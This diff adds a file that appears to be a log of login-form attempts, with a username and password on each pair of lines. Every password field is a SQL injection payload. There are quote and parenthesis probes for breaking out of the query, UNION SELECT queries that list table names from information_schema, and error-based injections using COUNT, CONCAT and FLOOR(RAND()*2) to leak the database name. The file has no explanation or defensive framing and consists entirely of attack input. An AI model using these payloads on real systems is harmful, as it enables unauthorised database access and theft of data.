@@ -1,0 +1,28 @@
+User Name:0
+Password:0' union select 1,table_name from information_schema.tables where table_schema=database() limit 1,1# 
+User Name:0
+Password:0" union select 1,table_name from information_schema.tables where table_schema=database() limit 1,1# 
+User Name:0
+Password:0" union select 1,table_name from information_schema.tables where table_schema=database() limit 1,1# 
+User Name:0
+Password:0") union select 1,table_name from information_schema.tables where table_schema=database() limit 1,1# 
+User Name:0
+Password:0") union select 1,table_name from information_schema.tables where table_schema=database() limit 1,1# 
+User Name:0
+Password:0"
+User Name:0
+Password:0'
+User Name:0
+Password:0'"
+User Name:0
+Password:0')
+User Name:0
+Password:0")
+User Name:0
+Password:0")
+User Name:1
+Password:0'  union SELECT COUNT(*),CONCAT((SELECT DATABASE()),FLOOR(RAND()*2)) AS a from information_schema.tables group by a#
+User Name:1
+Password:0"  union SELECT COUNT(*),CONCAT((SELECT DATABASE()),FLOOR(RAND()*2)) AS a from information_schema.tables group by a#
+User Name:1
+Password:0") union SELECT COUNT(*),CONCAT((SELECT DATABASE()),FLOOR(RAND()*2)) AS a from information_schema.tables group by a#
